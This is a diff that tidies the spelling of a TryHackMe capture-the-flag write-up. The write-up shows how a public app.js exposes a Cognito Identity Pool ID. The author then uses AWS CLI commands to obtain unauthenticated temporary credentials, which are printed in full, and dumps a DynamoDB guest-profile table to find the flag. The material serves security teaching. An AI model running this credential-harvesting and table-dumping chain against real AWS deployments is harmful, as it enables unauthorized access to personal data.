@@ -1,19 +1,19 @@
 # [Complimentary](https://tryhackme.com/room/hh-complimentary-05e0b604)
 
-- Hackers holiday 2026 Dat 3. This is a cloud based lab .
+- Hackers Holiday 2026 Dat 3. This is a cloud-based lab.
 
 ![screenshot](../data/com1.png)
 
 ![screenshot](../data/com2.png)
 
-- from the decrption above we have to deal with a misconfiguration in the aboue aws to get access to the resources. lets see .
+- From the description above, we have to deal with a misconfiguration in AWS to get access to the resources. Let's see.
 
-- we have given an Amazon S3 Static Website endpoint. 
+- We have been given an Amazon S3 Static Website endpoint. 
 
 ![screenshot](../data/com3.png)
 
-- vist the url in a browser, in the dev tools network tab i found a app.js file. 
-- lets visit /app.js endpoint
+- Visit the URL in a browser; in the dev tools network tab, I found an app.js file. 
+- Let's visit the /app.js endpoint
 
 ```
 // Byte Lotus Wellness â€” guest dashboard
@@ -89,28 +89,28 @@ AWS.config.credentials = new AWS.CognitoIdentityCredentials({
 });
 ```
 
-- This configuration is using Amazon Cognito Identity Pools to obtain temporary AWS credentials for users of the application.
+- This configuration uses Amazon Cognito Identity Pools to obtain temporary AWS credentials for users of the application.
 
 -  A common use case is allowing visitors to access specific AWS resources (such as DynamoDB or S3) without requiring them to create an account.
 
-- IDENTITY_POOL_ID: The Cognito Identity Pool ID configured to grant temporary AWS access to unauthenticated guest visitors
+- **IDENTITY_POOL_ID**: The Cognito Identity Pool ID configured to grant temporary AWS access to unauthenticated guest visitors
 
-- AWS_REGION: The AWS region 
+- **AWS_REGION**: The AWS region 
 
-- TABLE_NAME: The target DynamoDB table storing guest profiles (complimentary-GuestWellnessProfiles).
+- **TABLE_NAME**: The target DynamoDB table storing guest profiles (complimentary-GuestWellnessProfiles).
 
-- We need an Identityid to get the temoporary credentials for that we need an IDENTITY_POOL_ID which we alredy have.
+- We need an Identity ID to get the temporary credentials; for that, we need an IDENTITY_POOL_ID which we already have.
 
 ```
 aws cognito-identity get-id --region us-east-1 --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688" 
 ```
-- the above command gives a IdentityId
+- The above command gives an IdentityId
 ```
 {
     "IdentityId": "us-east-1:4d571309-b0bc-c195-81cc-181beedd41aa"
 }
 ```
-- Now we can exchange this identityId for a temporary credentials.
+- Now we can exchange this identityId for temporary credentials.
 
 ```
  aws cognito-identity get-credentials-for-identity --region us-east-1 --identity-id "us-east-1:4d571309-b0bc-c195-81cc-181beedd41aa" 
@@ -128,41 +128,41 @@ aws cognito-identity get-id --region us-east-1 --identity-pool-id "us-east-1:836
     }
 }
 ```
-- load the credentials to terminal and access the dynamodb table.
+- Load the credentials into our terminal that gives access to the DynamoDB table.
 
 ![screenshot](../data/com5.png)
 
 ```
-  ~/TryHackMe/Hackers_holiday ❯ export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYC5MSQ5JY"
+~/TryHackMe/Hackers_holiday ❯ export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYC5MSQ5JY"
 
-  ~/TryHackMe/Hackers_holiday ❯ export AWS_SECRET_ACCESS_KEY="1M/w7j8wCM/xLKXsFLzezi73SUvUk0uE50w4GDjn"
+~/TryHackMe/Hackers_holiday ❯ export AWS_SECRET_ACCESS_KEY="1M/w7j8wCM/xLKXsFLzezi73SUvUk0uE50w4GDjn"
 
-  ~/TryHackMe/Hackers_holiday ❯ export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEEAaCXVzLWVhc3QtMSJHMEUCIQDEUOD/W0feZWb3Whrm+7bvWy9hZ/RC5/S304ANGH7DZgIgJNCI71ooAR9zJq+IyOejjpJrkIzw08Sx/ndxD81bAiMqrQUICBAAGgwzMzIxNzMzNDcyNDgiDFxvLh3YU/0QxjM1hyqKBdB2Qlbn1rvBPbipIBNseIUoXoDLJa0o3zYkIIKt0+pJeSygRDdOM4/18OFgej6VyQWDB+NxvpQPQQ6bEOOKiasaDZ0G0uqUZKWgkbCqxWxzPePeKo7s+zeWuQHC2PdB1Q80SJtu0pGeymlJetJ/BF7xioPpm+emvM5Od1iKL8L8YPTG38AiJBB6FIX69HdVTFIJuM2RaEHY8Po979PhP1Zhqg5STfPD0TiH6KwQqbk19w52xS7xKDRvC6qe1+DmmacO4JZ1ywxtuNQ2144yrUemCuaVDibF97QuC4zj+BGv614Ln4z3tCJmeeHMLV5HMTtKNmt2zk0w80ubKA0BU9SJ5DJlIJgnaRVsky0JUADOk23am2BlhcBEwUJmxh37kvxfX14r4UIa6I2LQtKNHFf0ITVML5VWWU2wjBiwXVCrFu/5R10QSgxwg+P1MzKDtWsQf202LToT8Ed/wyNSlFGrYOJyD/aleefvTKmMVmZr9V6IKnrBfeelzfC0lK0N2TObozNAxTrx/vgZW6K4hZQkL40m31OyTIOwXC5gDOALmgQGIGHVTrUGTP3FcI708Rp5Uor1nRIFpxJ8sXqYAQVlur24Vdec8gVPFlLhhk9aUWEvVguoxmCWxzWBcUsPBZPtWKp4dzpERIY8b7/M9YwF4XHbEP8/0TlyT8H7regpgfcPmbIewJyy80Rgq3W3sNbglcuca8BI7oHGQw/A08aDU2RaIUFgYVWNYMJ9s2TgRdrTWiyaarDwnCCSYSPQ0BCVX5kaa1haJkMjEDQVq7YlZfIiK2eeqKB2cCcwn87RYcmKUGF7nHcEvxW6aIBKj/j34wVYFqDXvFWInNgeqsJd7MgfhFvzmUXwMKSfxtMGOt8Cv651FeN4KrO9vHaLfwDp7KvbwZNo+7TAvaSV4cNHdNYT9ZsPSOppCuO9C3la8/9/v+9VsJXwIf5KPmLerd1XrLTwCH2NJ64IKHoxOOJ9ypLk5fZw7EArcVBbT/Rtsf5aous4MSICJ01VC2rLPYmniIY5VoWhXM5e3CdpdguCgVhCc2Syr3iOeYiKrg6PGuMgDFsFtFpSz+NQklXDlHsx2G/QQQRm1qZBEg1+Oi4/HO/Eyq5zRtC+GWaNsio+99IajDkBXjJwpLn3hcV23DmmjVf/dcwLxHR4tt6CXwrDKZhm3QtFQMN8HcVGl0lwyNGNN5zXIlt0mKzh1bQikmHEmy7/kYQr1klVzBLUVOxMluj3R2e4GQvevKIEbdUnshKWv7Lb7DjqvzzPLXraC99ssQE3fhBq4g6SuA7C+lXdj1/nQV8OgAQRY8bzmOzXd16/zrxb4jWwWc8kZz8ayW7H"
+~/TryHackMe/Hackers_holiday ❯ export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEEAaCXVzLWVhc3QtMSJHMEUCIQDEUOD/W0feZWb3Whrm+7bvWy9hZ/RC5/S304ANGH7DZgIgJNCI71ooAR9zJq+IyOejjpJrkIzw08Sx/ndxD81bAiMqrQUICBAAGgwzMzIxNzMzNDcyNDgiDFxvLh3YU/0QxjM1hyqKBdB2Qlbn1rvBPbipIBNseIUoXoDLJa0o3zYkIIKt0+pJeSygRDdOM4/18OFgej6VyQWDB+NxvpQPQQ6bEOOKiasaDZ0G0uqUZKWgkbCqxWxzPePeKo7s+zeWuQHC2PdB1Q80SJtu0pGeymlJetJ/BF7xioPpm+emvM5Od1iKL8L8YPTG38AiJBB6FIX69HdVTFIJuM2RaEHY8Po979PhP1Zhqg5STfPD0TiH6KwQqbk19w52xS7xKDRvC6qe1+DmmacO4JZ1ywxtuNQ2144yrUemCuaVDibF97QuC4zj+BGv614Ln4z3tCJmeeHMLV5HMTtKNmt2zk0w80ubKA0BU9SJ5DJlIJgnaRVsky0JUADOk23am2BlhcBEwUJmxh37kvxfX14r4UIa6I2LQtKNHFf0ITVML5VWWU2wjBiwXVCrFu/5R10QSgxwg+P1MzKDtWsQf202LToT8Ed/wyNSlFGrYOJyD/aleefvTKmMVmZr9V6IKnrBfeelzfC0lK0N2TObozNAxTrx/vgZW6K4hZQkL40m31OyTIOwXC5gDOALmgQGIGHVTrUGTP3FcI708Rp5Uor1nRIFpxJ8sXqYAQVlur24Vdec8gVPFlLhhk9aUWEvVguoxmCWxzWBcUsPBZPtWKp4dzpERIY8b7/M9YwF4XHbEP8/0TlyT8H7regpgfcPmbIewJyy80Rgq3W3sNbglcuca8BI7oHGQw/A08aDU2RaIUFgYVWNYMJ9s2TgRdrTWiyaarDwnCCSYSPQ0BCVX5kaa1haJkMjEDQVq7YlZfIiK2eeqKB2cCcwn87RYcmKUGF7nHcEvxW6aIBKj/j34wVYFqDXvFWInNgeqsJd7MgfhFvzmUXwMKSfxtMGOt8Cv651FeN4KrO9vHaLfwDp7KvbwZNo+7TAvaSV4cNHdNYT9ZsPSOppCuO9C3la8/9/v+9VsJXwIf5KPmLerd1XrLTwCH2NJ64IKHoxOOJ9ypLk5fZw7EArcVBbT/Rtsf5aous4MSICJ01VC2rLPYmniIY5VoWhXM5e3CdpdguCgVhCc2Syr3iOeYiKrg6PGuMgDFsFtFpSz+NQklXDlHsx2G/QQQRm1qZBEg1+Oi4/HO/Eyq5zRtC+GWaNsio+99IajDkBXjJwpLn3hcV23DmmjVf/dcwLxHR4tt6CXwrDKZhm3QtFQMN8HcVGl0lwyNGNN5zXIlt0mKzh1bQikmHEmy7/kYQr1klVzBLUVOxMluj3R2e4GQvevKIEbdUnshKWv7Lb7DjqvzzPLXraC99ssQE3fhBq4g6SuA7C+lXdj1/nQV8OgAQRY8bzmOzXd16/zrxb4jWwWc8kZz8ayW7H"
 
-  ~/TryHackMe/Hackers_holiday ❯ export AWS_DEFAULT_REGION="us-east-1"
+~/TryHackMe/Hackers_holiday ❯ export AWS_DEFAULT_REGION="us-east-1"
 ```
 
-- To verify the credentials i am goint to use 
+- To verify the credentials I am going to use 
 
 ```aws sts get-caller-identity``` 
 
--which Returns identity details for the active AWS credentials set in the environment.
+- which returns identity details for the active AWS credentials set in the environment.
 
 ```
 {
-    "UserId": "AROAU2VYTBGYCEB4JME2S:CognitoIdentityCredentials",
+    "UserId": "AROAU2VYTBGYCEB4JME2S: CognitoIdentityCredentials",
     "Account": "332173347248",
     "Arn": "arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials"
 }
 ```
-- from the output we can see we have "complimentary-cognito-unauth-role"
-- now with the access we can directly query the database.
+- From the output, we can see we have "complimentary-cognito-unauth-role"
+- Now, with this access, we can directly query the database.
 
 ```
 aws dynamodb scan --table-name complimentary-GuestWellnessProfiles
 ```
 
-- aws dynamodb scan: Scans and retrieves all records from the target table
+- **aws dynamodb scan**: Scans and retrieves all records from the target table
 
 ```
      {
@@ -189,6 +189,6 @@ aws dynamodb scan --table-name complimentary-GuestWellnessProfiles
             }
         },
 ```
-- In the above record we can see the flag.
+- In the above record, we can see the flag.
 
 **Flag: THM{fr33_app_fr33_d4t4!}**
